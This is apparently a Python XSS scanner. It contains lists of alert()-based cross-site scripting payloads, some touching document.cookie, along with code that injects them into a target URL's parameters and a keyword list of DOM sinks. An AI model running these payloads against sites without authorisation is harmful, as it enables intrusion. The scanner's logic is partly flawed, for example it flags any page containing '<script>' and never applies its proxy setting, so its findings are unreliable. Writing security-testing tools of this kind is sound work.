#!/usr/bin/env python3
"""
XSS Scanner
Detects Cross-Site Scripting vulnerabilities
"""

import requests
import sys
import argparse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re

# XSS payloads organized by context
PAYLOADS_REFLECTED = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<marquee onscroll=alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>",
    "<isindex type=image src=1 onerror=alert('XSS')>",
]

PAYLOADS_DOM = [
    "#'><script>alert('XSS')</script>",
    "#'><img src=x onerror=alert('XSS')>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
]

PAYLOADS_ATTRIBUTE = [
    "' onmouseover='alert(1)'",
    "' onclick='alert(1)'",
    "' onfocus='alert(1)' autofocus='",
    "' onerror='alert(1)'",
    "javascript:alert(1)",
]

PAYLOADS_JS_CONTEXT = [
    "';alert('XSS');//",
    "';alert('XSS');'",
    "\\x27;alert('XSS')//",
    "'-alert(1)-'",
    "'+alert(1)+'",
]


def find_input_points(url):
    """Find potential input points (forms, URL parameters)"""
    try:
        response = requests.get(url, timeout=10)
        content = response.text
        
        # Find forms
        forms = re.findall(r'<form[^>]*>.*?<\/form>', content, re.DOTALL | re.IGNORECASE)
        
        # Find input fields
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', content, re.IGNORECASE)
        
        # Find URL parameters
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        
        return {
            "forms": forms,
            "inputs": inputs,
            "url_params": params
        }
    except Exception as e:
        print(f"[!] Error finding input points: {e}")
        return None


def test_reflected_xss(url, param, payload):
    """Test for reflected XSS"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if param not in params:
        return False
    
    params[param] = payload
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    
    try:
        response = requests.get(test_url, timeout=10)
        content = response.text
        
        # Check if payload is reflected
        if payload in content:
            # Check if it's actually executed (not encoded)
            if not is_encoded(payload, content):
                return True, "Reflected XSS - payload not encoded"
            else:
                return False, "Payload reflected but encoded"
        
        # Check for partial reflection
        if any(part in content for part in ["<script>", "onerror", "onload"]):
            return True, "Possible XSS - suspicious content reflected"
        
        return False, None
    except Exception as e:
        return False, str(e)


def is_encoded(payload, content):
    """Check if payload is properly encoded in response"""
    encoded_versions = [
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        payload.replace("\"", "&quot;"),
        payload.replace("'", "&#x27;"),
        payload.replace("&", "&amp;"),
    ]
    
    for encoded in encoded_versions:
        if encoded in content:
            return True
    
    return False


def test_stored_xss(url, param, payload):
    """Test for stored XSS (basic check)"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if param not in params:
        return False
    
    params[param] = payload
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    
    try:
        # Submit payload
        requests.get(test_url, timeout=10)
        
        # Check if payload persists
        response = requests.get(url, timeout=10)
        
        if payload in response.text:
            return True, "Possible stored XSS - payload persists"
        
        return False, None
    except Exception as e:
        return False, str(e)


def test_dom_xss(url):
    """Test for DOM-based XSS"""
    dom_indicators = [
        "document.write",
        "innerHTML",
        "outerHTML",
        "eval(",
        "setTimeout(",
        "setInterval(",
        "location.href",
        "location.replace",
        "location.assign",
        "window.name",
        "document.cookie",
    ]
    
    try:
        response = requests.get(url, timeout=10)
        content = response.text
        
        found = []
        for indicator in dom_indicators:
            if indicator in content:
                found.append(indicator)
        
        if found:
            return True, f"DOM XSS sinks found: {', '.join(found)}"
        
        return False, None
    except Exception as e:
        return False, str(e)


def scan_xss(url):
    """Scan URL for XSS vulnerabilities"""
    print(f"[*] Scanning: {url}\n")
    
    input_points = find_input_points(url)
    if not input_points:
        print("[!] Could not find input points")
        return []
    
    print(f"[+] Found {len(input_points['url_params'])} URL parameters")
    print(f"[+] Found {len(input_points['inputs'])} input fields")
    print(f"[+] Found {len(input_points['forms'])} forms\n")
    
    vulnerabilities = []
    
    # Test URL parameters
    for param in input_points['url_params']:
        print(f"[*] Testing parameter: {param}")
        
        for payload in PAYLOADS_REFLECTED[:5]:  # Test top payloads
            is_vuln, message = test_reflected_xss(url, param, payload)
            if is_vuln:
                print(f"[+] Reflected XSS found!")
                print(f"    Payload: {payload}")
                print(f"    Details: {message}")
                vulnerabilities.append({
                    "param": param,
                    "type": "Reflected XSS",
                    "payload": payload,
                    "message": message
                })
                break
        
        # Test for stored XSS
        is_vuln, message = test_stored_xss(url, param, "<script>alert('XSS')</script>")
        if is_vuln:
            print(f"[+] {message}")
            vulnerabilities.append({
                "param": param,
                "type": "Stored XSS",
                "payload": "<script>alert('XSS')</script>",
                "message": message
            })
    
    # Test for DOM XSS
    print("\n[*] Testing for DOM-based XSS...")
    is_vuln, message = test_dom_xss(url)
    if is_vuln:
        print(f"[+] {message}")
        vulnerabilities.append({
            "param": "N/A",
            "type": "DOM XSS",
            "payload": "N/A",
            "message": message
        })
    
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description="XSS Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Specific parameter to test")
    parser.add_argument("--proxy", help="Proxy URL")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    vulnerabilities = scan_xss(args.url)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} XSS vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Parameter: {vuln['param']}")
            print(f"     Type: {vuln['type']}")
            print(f"     Payload: {vuln['payload']}")
            print(f"     Details: {vuln['message']}")
            print()
    else:
        print("\n[+] No XSS vulnerabilities detected")
        print("[!] Note: This is a basic scanner. Manual testing may find more issues.")


if __name__ == "__main__":
    main()
